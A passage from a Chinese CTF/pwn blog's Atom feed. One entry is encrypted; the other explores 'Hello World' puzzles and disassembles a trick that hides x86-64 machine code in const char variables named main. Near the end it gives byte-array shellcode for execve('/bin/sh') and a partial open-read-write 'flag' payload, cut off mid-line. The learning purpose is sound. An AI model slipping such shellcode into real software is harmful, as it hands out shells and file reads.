    <link href="https://nocbtm.github.io/2020/05/08/%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E6%96%B9%E5%BC%8F/"/>
    <id>https://nocbtm.github.io/2020/05/08/一种新的动态链接方式/</id>
    <published>2020-05-08T04:20:22.000Z</published>
    <updated>2020-05-11T14:02:11.521Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> U2FsdGVkX19hitnhwD+V87FJGFwOf+eCdfy7b7l9tuM= </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>对hello world的重新认识</title>
    <link href="https://nocbtm.github.io/2020/05/08/%E5%AF%B9hello-world%E7%9A%84%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86/"/>
    <id>https://nocbtm.github.io/2020/05/08/对hello-world的重新认识/</id>
    <published>2020-05-08T02:07:19.000Z</published>
    <updated>2020-05-08T04:11:22.268Z</updated>
    
    <content type="html"><![CDATA[<p> 前段时间在逛知乎的时候，偶然发现一道有意思的编程题<br><img alt="知乎" data-src="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/7hf2r1wl6noec3akgedgzpbqsq.png" class="lozad"><br>参考链接：<a href="https://www.zhihu.com/question/66088898/answer/238036040" target="_blank" rel="noopener">hello world编程题你会吗？</a><br> Helllo World算是最简单也最基础的程序了，我们一般在编写c语言代码的时候，输入输出都会很自然地联想到frintf()和scanf()，这几道题非常地有意思，要求跳出常规思维输出’’Hello World’。</p><h2 id="1-不用-“-“-输出Hello-World！"><a href="#1-不用-“-“-输出Hello-World！" class="headerlink" title="1.不用 “ “ 输出Hello,World！"></a>1.不用 “ “ 输出Hello,World！</h2><p> 不用” “输出，那么就不能用scanf()这个函数了，那么怎么办呢，想到c语言在处理字符常量的时候是把它当做数字来处理的，所以可以用普通char()函数把”Hello World”的每个字符的Ascii码输出。<br> 这道题如果引伸为不用引号来输出(单引号和双引号都不能使用),其实也是一样的，putchar()函数可以直接用数字作为参数。</p><h2 id="2-不用-输出Hello，World！"><a href="#2-不用-输出Hello，World！" class="headerlink" title="2.不用 ; 输出Hello，World！"></a>2.不用 ; 输出Hello，World！</h2><p> 不用;输出，也就是出代码中不能出现完整的语句，仔细思考下在c语言当中哪些位置可以不用;的，发现if语句刚好满足要求。</p><p>附上同时满足条件1和2的程序代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> ()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">72</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">101</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">108</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">108</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">111</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">32</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">87</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">111</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">114</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">108</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">putchar</span>(<span class="number">100</span>))&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 这里需要说明的一点是，在最新的c标准中，已经不允许main函数的类型为void。</p><h2 id="3-不用-输出Hello-World！"><a href="#3-不用-输出Hello-World！" class="headerlink" title="3.不用# 输出Hello,World！"></a>3.不用# 输出Hello,World！</h2><p> 这道题不得不感叹自己所学的知识的贫瘠，一直想着怎么在windows编译环境下怎么达到这个条件，看了原帖的回复，说是要重新定义printf()函数，然后在dev里试了试重新定义了一下printf函数，发现报错没有定义printf()这个函数。<br> 后来才发现原来重新定义printf()函数在linux环境下是可以实现要求的。</p><p><img alt="img" data-src="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/dl53pg26qconiqrkjv1b43o1g7.png" class="lozad"></p><p>代码如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">printf</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *format,...)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">int</span> ()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"hello, world"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-不用括号输出Hello-World！-包括各种括号-，-lt-gt-，｛｝，［］都不能用"><a href="#4-不用括号输出Hello-World！-包括各种括号-，-lt-gt-，｛｝，［］都不能用" class="headerlink" title="4.不用括号输出Hello,World！(包括各种括号()，&lt;&gt;，｛｝，［］都不能用 )"></a>4.不用括号输出Hello,World！(包括各种括号()，&lt;&gt;，｛｝，［］都不能用 )</h2><p> 第四题出题人并不是为了输出”Hello World”出的题，本意在了解ELF文件格式。<br>附上知乎大佬的代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> main = <span class="number">0x55</span>, main1 = <span class="number">0x48</span>, main2 = <span class="number">0x89</span>, main3 = <span class="number">0xe5</span>, main4 = <span class="number">0xb8</span>,</span><br><span class="line">           main5 = <span class="number">0x01</span>, main6 = <span class="number">0x00</span>, main7 = <span class="number">0x00</span>, main8 = <span class="number">0x00</span>, main9 = <span class="number">0xbb</span>,</span><br><span class="line">           main10 = <span class="number">0x01</span>, main11 = <span class="number">0x00</span>, main12 = <span class="number">0x00</span>, main13 = <span class="number">0x00</span>,</span><br><span class="line">           main14 = <span class="number">0x67</span>, main15 = <span class="number">0x8d</span>, main16 = <span class="number">0x35</span>, main17 = <span class="number">0x10</span>,</span><br><span class="line">           main18 = <span class="number">0x00</span>, main19 = <span class="number">0x00</span>, main20 = <span class="number">0x00</span>, main21 = <span class="number">0xba</span>,</span><br><span class="line">           main22 = <span class="number">0x0d</span>, main23 = <span class="number">0x00</span>, main24 = <span class="number">0x00</span>, main25 = <span class="number">0x00</span>,</span><br><span class="line">           main26 = <span class="number">0x0f</span>, main27 = <span class="number">0x05</span>, main28 = <span class="number">0xb8</span>, main29 = <span class="number">0x3c</span>,</span><br><span class="line">           main30 = <span class="number">0x00</span>, main31 = <span class="number">0x00</span>, main32 = <span class="number">0x00</span>, main33 = <span class="number">0x31</span>,</span><br><span class="line">           main34 = <span class="number">0xdb</span>, main35 = <span class="number">0x0f</span>, main36 = <span class="number">0x05</span>, main37 = <span class="number">0x48</span>,</span><br><span class="line">           main38 = <span class="number">0x65</span>, main39 = <span class="number">0x6c</span>, main40 = <span class="number">0x6c</span>, main41 = <span class="number">0x6f</span>,</span><br><span class="line">           main42 = <span class="number">0x20</span>, main43 = <span class="number">0x57</span>, main44 = <span class="number">0x6f</span>, main45 = <span class="number">0x72</span>,</span><br><span class="line">           main46 = <span class="number">0x6c</span>, main47 = <span class="number">0x64</span>, main48 = <span class="number">0x21</span>, main49 = <span class="number">0x0a</span>,</span><br><span class="line">           main50 = <span class="number">0x5d</span>;</span><br></pre></td></tr></table></figure><h2 id="5-对上述代码的分析"><a href="#5-对上述代码的分析" class="headerlink" title="5.对上述代码的分析"></a>5.对上述代码的分析</h2><p>其中最让我不能理解的是第四种方式输出的Hello ,World!</p><p>我用gcc编译器，把他编译后运行，的确能输出Hello ,World!</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜   gcc test.c -o <span class="built_in">test</span></span><br><span class="line">➜   ./<span class="built_in">test</span></span><br><span class="line">Hello World!</span><br></pre></td></tr></table></figure><p>用ida反编译一下，可以看到start函数还是很正常的，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004003E0 _start          proc near               ; DATA XREF: LOAD:0000000000400018↑o</span><br><span class="line">.text:00000000004003E0 ; __unwind &#123;</span><br><span class="line">.text:00000000004003E0                 xor     ebp, ebp</span><br><span class="line">.text:00000000004003E2                 mov     r9, rdx         ; rtld_fini</span><br><span class="line">.text:00000000004003E5                 pop     rsi             ; argc</span><br><span class="line">.text:00000000004003E6                 mov     rdx, rsp        ; ubp_av</span><br><span class="line">.text:00000000004003E9                 and     rsp, 0FFFFFFFFFFFFFFF0h</span><br><span class="line">.text:00000000004003ED                 push    rax</span><br><span class="line">.text:00000000004003EE                 push    rsp             ; stack_end</span><br><span class="line">.text:00000000004003EF                 mov     r8, offset __libc_csu_fini ; fini</span><br><span class="line">.text:00000000004003F6                 mov     rcx, offset __libc_csu_init ; init</span><br><span class="line">.text:00000000004003FD                 mov     rdi, offset main ; main</span><br><span class="line">.text:0000000000400404                 call    ___libc_start_main</span><br><span class="line">.text:0000000000400409                 hlt</span><br><span class="line">.text:0000000000400409 ; &#125; // starts at 4003E0</span><br><span class="line">.text:0000000000400409 _start          endp</span><br><span class="line">.text:0000000000400409</span><br></pre></td></tr></table></figure><p>继续看main函数,就变得很不正常了，而且他是在data段。？？？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">.rodata:0000000000400564 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.rodata:0000000000400564 main            db  55h ; U             ; DATA XREF: _start+1D↑o</span><br><span class="line">.rodata:0000000000400565                 public main1</span><br><span class="line">.rodata:0000000000400565 main1           db  48h ; H</span><br><span class="line">.rodata:0000000000400566                 public main2</span><br><span class="line">.rodata:0000000000400566 main2           db  89h</span><br><span class="line">.rodata:0000000000400567                 public main3</span><br><span class="line">.rodata:0000000000400567 main3           db 0E5h</span><br><span class="line">.rodata:0000000000400568                 public main4</span><br><span class="line">.rodata:0000000000400568 main4           db 0B8h</span><br><span class="line">.rodata:0000000000400569                 public main5</span><br><span class="line">.rodata:0000000000400569 main5           db    1</span><br><span class="line">.rodata:000000000040056A                 public main6</span><br><span class="line">.rodata:000000000040056A main6           db    0</span><br><span class="line">.rodata:000000000040056B                 public main7</span><br><span class="line">.rodata:000000000040056B main7           db    0</span><br><span class="line">.rodata:000000000040056C                 public main8</span><br><span class="line">.rodata:000000000040056C main8           db    0</span><br><span class="line">.rodata:000000000040056D                 public main9</span><br><span class="line">.rodata:000000000040056D main9           db 0BBh</span><br><span class="line">.rodata:000000000040056E                 public main10</span><br><span class="line">.rodata:000000000040056E main10          db    1</span><br><span class="line">.rodata:000000000040056F                 public main11</span><br><span class="line">.rodata:000000000040056F main11          db    0</span><br><span class="line">.rodata:0000000000400570                 public main12</span><br><span class="line">.rodata:0000000000400570 main12          db    0</span><br><span class="line">.rodata:0000000000400571                 public main13</span><br><span class="line">.rodata:0000000000400571 main13          db    0</span><br><span class="line">.rodata:0000000000400572                 public main14</span><br><span class="line">.rodata:0000000000400572 main14          db  67h ; g</span><br><span class="line">.rodata:0000000000400573                 public main15</span><br><span class="line">.rodata:0000000000400573 main15          db  8Dh</span><br><span class="line">.rodata:0000000000400574                 public main16</span><br><span class="line">.rodata:0000000000400574 main16          db  35h ; 5</span><br><span class="line">.rodata:0000000000400575                 public main17</span><br><span class="line">.rodata:0000000000400575 main17          db  10h</span><br><span class="line">.rodata:0000000000400576                 public main18</span><br><span class="line">.rodata:0000000000400576 main18          db    0</span><br><span class="line">.rodata:0000000000400577                 public main19</span><br><span class="line">.rodata:0000000000400577 main19          db    0</span><br><span class="line">.rodata:0000000000400578                 public main20</span><br><span class="line">.rodata:0000000000400578 main20          db    0</span><br><span class="line">.rodata:0000000000400579                 public main21</span><br><span class="line">.rodata:0000000000400579 main21          db 0BAh</span><br><span class="line">.rodata:000000000040057A                 public main22</span><br><span class="line">.rodata:000000000040057A main22          db  0Dh</span><br><span class="line">.rodata:000000000040057B                 public main23</span><br><span class="line">.rodata:000000000040057B main23          db    0</span><br><span class="line">.rodata:000000000040057C                 public main24</span><br><span class="line">.rodata:000000000040057C main24          db    0</span><br><span class="line">.rodata:000000000040057D                 public main25</span><br><span class="line">.rodata:000000000040057D main25          db    0</span><br><span class="line">.rodata:000000000040057E                 public main26</span><br><span class="line">.rodata:000000000040057E main26          db  0Fh</span><br><span class="line">.rodata:000000000040057F                 public main27</span><br><span class="line">.rodata:000000000040057F main27          db    5</span><br><span class="line">.rodata:0000000000400580                 public main28</span><br><span class="line">.rodata:0000000000400580 main28          db 0B8h</span><br><span class="line">.rodata:0000000000400581                 public main29</span><br><span class="line">.rodata:0000000000400581 main29          db  3Ch ; &lt;</span><br><span class="line">.rodata:0000000000400582                 public main30</span><br><span class="line">.rodata:0000000000400582 main30          db    0</span><br><span class="line">.rodata:0000000000400583                 public main31</span><br><span class="line">.rodata:0000000000400583 main31          db    0</span><br><span class="line">.rodata:0000000000400584                 public main32</span><br><span class="line">.rodata:0000000000400584 main32          db    0</span><br><span class="line">.rodata:0000000000400585                 public main33</span><br><span class="line">.rodata:0000000000400585 main33          db  31h ; 1</span><br><span class="line">.rodata:0000000000400586                 public main34</span><br><span class="line">.rodata:0000000000400586 main34          db 0DBh</span><br><span class="line">.rodata:0000000000400587                 public main35</span><br><span class="line">.rodata:0000000000400587 main35          db  0Fh</span><br><span class="line">.rodata:0000000000400588                 public main36</span><br><span class="line">.rodata:0000000000400588 main36          db    5</span><br><span class="line">.rodata:0000000000400589                 public main37</span><br><span class="line">.rodata:0000000000400589 main37          db  48h ; H</span><br><span class="line">.rodata:000000000040058A                 public main38</span><br><span class="line">.rodata:000000000040058A main38          db  65h ; e</span><br><span class="line">.rodata:000000000040058B                 public main39</span><br><span class="line">.rodata:000000000040058B main39          db  6Ch ; l</span><br><span class="line">.rodata:000000000040058C                 public main40</span><br><span class="line">.rodata:000000000040058C main40          db  6Ch ; l</span><br><span class="line">.rodata:000000000040058D                 public main41</span><br><span class="line">.rodata:000000000040058D main41          db  6Fh ; o</span><br><span class="line">.rodata:000000000040058E                 public main42</span><br><span class="line">.rodata:000000000040058E main42          db  20h</span><br><span class="line">.rodata:000000000040058F                 public main43</span><br><span class="line">.rodata:000000000040058F main43          db  57h ; W</span><br><span class="line">.rodata:0000000000400590                 public main44</span><br><span class="line">.rodata:0000000000400590 main44          db  6Fh ; o</span><br><span class="line">.rodata:0000000000400591                 public main45</span><br><span class="line">.rodata:0000000000400591 main45          db  72h ; r</span><br><span class="line">.rodata:0000000000400592                 public main46</span><br><span class="line">.rodata:0000000000400592 main46          db  6Ch ; l</span><br><span class="line">.rodata:0000000000400593                 public main47</span><br><span class="line">.rodata:0000000000400593 main47          db  64h ; d</span><br><span class="line">.rodata:0000000000400594                 public main48</span><br><span class="line">.rodata:0000000000400594 main48          db  21h ; !</span><br><span class="line">.rodata:0000000000400595                 public main49</span><br><span class="line">.rodata:0000000000400595 main49          db  0Ah</span><br><span class="line">.rodata:0000000000400596                 public main50</span><br><span class="line">.rodata:0000000000400596 main50          db  5Dh ; ]</span><br><span class="line">.rodata:0000000000400596 _rodata         ends</span><br></pre></td></tr></table></figure><p>接下来我用gdb动态调试一波,下断点到main函数的地方,</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b *0x400564</span><br><span class="line">Breakpoint 2 at 0x400564</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Breakpoint 2, 0x0000000000400564 in main ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────</span><br><span class="line"> RAX  0x400564 (main) ◂— push   rbp</span><br><span class="line"> RBX  0x0</span><br><span class="line"> RCX  0x0</span><br><span class="line"> RDX  0x7fffffffde28 —▸ 0x7fffffffe1df ◂— &apos;XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat0&apos;</span><br><span class="line"> RDI  0x1</span><br><span class="line"> RSI  0x7fffffffde18 —▸ 0x7fffffffe1ac ◂— &apos;/mnt/hgfs/ubuntu_share/help/test&apos;</span><br><span class="line"> R8   0x400550 (__libc_csu_fini) ◂— ret    </span><br><span class="line"> R9   0x7ffff7de7ac0 (_dl_fini) ◂— push   rbp</span><br><span class="line"> R10  0x846</span><br><span class="line"> R11  0x7ffff7a2d740 (__libc_start_main) ◂— push   r14</span><br><span class="line"> R12  0x4003e0 (_start) ◂— xor    ebp, ebp</span><br><span class="line"> R13  0x7fffffffde10 ◂— 0x1</span><br><span class="line"> R14  0x0</span><br><span class="line"> R15  0x0</span><br><span class="line"> RBP  0x4004e0 (__libc_csu_init) ◂— push   r15</span><br><span class="line"> RSP  0x7fffffffdd38 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax</span><br><span class="line"> RIP  0x400564 (main) ◂— push   rbp</span><br><span class="line">─────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────</span><br><span class="line"> ► 0x400564 &lt;main&gt;      push   rbp &lt;0x4004e0&gt;</span><br><span class="line">   0x400565 &lt;main1&gt;     mov    rbp, rsp</span><br><span class="line">   0x400568 &lt;main4&gt;     mov    eax, 1</span><br><span class="line">   0x40056d &lt;main9&gt;     mov    ebx, 1</span><br><span class="line">   0x400572 &lt;main14&gt;    lea    esi, [eip + 0x10]</span><br><span class="line">   0x400579 &lt;main21&gt;    mov    edx, 0xd</span><br><span class="line">   0x40057e &lt;main26&gt;    syscall </span><br><span class="line">   0x400580 &lt;main28&gt;    mov    eax, 0x3c</span><br><span class="line">   0x400585 &lt;main33&gt;    xor    ebx, ebx</span><br><span class="line">   0x400587 &lt;main35&gt;    syscall </span><br><span class="line">   0x400589 &lt;main37&gt;    insb   byte ptr [rdi], dx</span><br><span class="line">──────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────</span><br><span class="line">00:0000│ rsp  0x7fffffffdd38 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax</span><br><span class="line">01:0008│      0x7fffffffdd40 ◂— 0x1</span><br><span class="line">02:0010│      0x7fffffffdd48 —▸ 0x7fffffffde18 —▸ 0x7fffffffe1ac ◂— &apos;/mnt/hgfs/ubuntu_share/help/test&apos;</span><br><span class="line">03:0018│      0x7fffffffdd50 ◂— 0x1f7ffcca0</span><br><span class="line">04:0020│      0x7fffffffdd58 —▸ 0x400564 (main) ◂— push   rbp</span><br><span class="line">05:0028│      0x7fffffffdd60 ◂— 0x0</span><br><span class="line">06:0030│      0x7fffffffdd68 ◂— 0x74c583ff1005bf92</span><br><span class="line">07:0038│      0x7fffffffdd70 —▸ 0x4003e0 (_start) ◂— xor    ebp, ebp</span><br><span class="line">────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────</span><br><span class="line"> ► f 0           400564 main</span><br><span class="line">   f 1     7ffff7a2d830 __libc_start_main+240</span><br><span class="line">Breakpoint *0x400564</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>看到这里我明白了，上述代码其实是一段shellcode，gcc编译器是如何识别并编译的，这里我不得而知，看来还要再看一遍程序员的自我修养啊。</p><p>分析一下生成的汇编吧。<code>0x400572 &lt;main14&gt;    lea    esi, [eip + 0x10]</code> 其中这段汇编让我很感兴趣，第一次见到用eip作为基址然后调整偏移来传参的,很显然里面存的是Hello world，然后syscall系统调用write函数输出，第二次syscall系统调用exit函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10s 0x400579+0x10</span><br><span class="line">0x400589 &lt;main37&gt;:&quot;Hello World!\n]&quot;</span><br><span class="line">0x400598:&quot;\001\033\003;,&quot;</span><br><span class="line">0x40059e:&quot;&quot;</span><br><span class="line">0x40059f:&quot;&quot;</span><br><span class="line">0x4005a0:&quot;\004&quot;</span><br><span class="line">0x4005a2:&quot;&quot;</span><br><span class="line">0x4005a3:&quot;&quot;</span><br><span class="line">0x4005a4:&quot;\030\376\377\377x&quot;</span><br><span class="line">0x4005aa:&quot;&quot;</span><br><span class="line">0x4005ab:&quot;&quot;</span><br></pre></td></tr></table></figure><h2 id="6-模仿操作"><a href="#6-模仿操作" class="headerlink" title="6.模仿操作"></a>6.模仿操作</h2><p>用上述方式写 execve(“/bin/sh”)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>  main = <span class="number">0x6a</span>, main1 = <span class="number">0x42</span>, main2 = <span class="number">0x58</span>, main3 = <span class="number">0xfe</span>, main4 = <span class="number">0xc4</span>, main5 = <span class="number">0x48</span>, main6 = <span class="number">0x99</span>, main7 = <span class="number">0x52</span>, main8 = <span class="number">0x48</span>, main9 = <span class="number">0xbf</span>,main10 = <span class="number">0x2f</span>, main11 = <span class="number">0x62</span>, main12 = <span class="number">0x69</span>, main13 = <span class="number">0x6e</span>, main14 = <span class="number">0x2f</span>, main15 = <span class="number">0x2f</span>, main16 = <span class="number">0x73</span>, main17 = <span class="number">0x68</span>, main18 = <span class="number">0x57</span>, main19 = <span class="number">0x54</span>,main20 = <span class="number">0x5e</span>, main21 = <span class="number">0x49</span>, main22 = <span class="number">0x89</span>, main23 = <span class="number">0xd0</span>, main24 = <span class="number">0x49</span>, main25 = <span class="number">0x89</span>, main26 = <span class="number">0xd2</span>, main27 = <span class="number">0x0f</span>, main28 = <span class="number">0x05</span>;</span><br></pre></td></tr></table></figure><p>orw flag</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> main=<span class="number">0x48</span>,main1=<span class="number">0xb8</span>,main2=<span class="number">0x1</span>,main3=<span class="number">0x1</span>,main4=<span class="number">0x1</span>,main5=<span class="number">0x1</span>,main6=<span class="number">0x1</span>,main7=<span class="number">0x1</span>,main8=<span class="number">0x1</span>,main9=<span class="number">0x1</span>,main10=<span class="number">0x50</span>,main11=<span class="number">0x48</span>,main12=<span class="number">0xb8</span>,main13=<span class="number">0x67</span>,main14=<span class="number">0x2e</span>,main15=<span class="number">0x67</span>,main16=<span class="number">0x6d</span>,main17=<span class="number">0x60</span>,main18=<span class="number">0x66</span>,main19=<span class="number">0x1</span>,main20=<span class="number">0x1</span>,main21=<span class="number">0x48</span>,main22=<span class="number">0x31</span>,main23=<span class="number">0x4</span>,main24=<span class="number">0x24</span>,main25=<span class="number">0x48</span>,main26=<span class="number">0xb8</span>,main27=<span class="number">0x2f</span>,main28=<span class="number">0x68</span>,main29=<span class="number">0x6f</span>,main30=<span class="number">0x6d</span>,main31=<span class="number">0x65</span>,main32=<span class="number">0x2f</span>,main33=<span class="number">0x63</span>,main34=<span class="number">0x74</span>,main35=<span class="number">0x50</span>,main36=<span class="number">0x48</span>,main37=<span class="number">0x89</span>,main38=<span class="number">0xe7</span>,main39=<span class="number">0x31</span>,main40=<span class="number">0xd2</span>,main41=<span class="number">0x31</span>,main42=<span 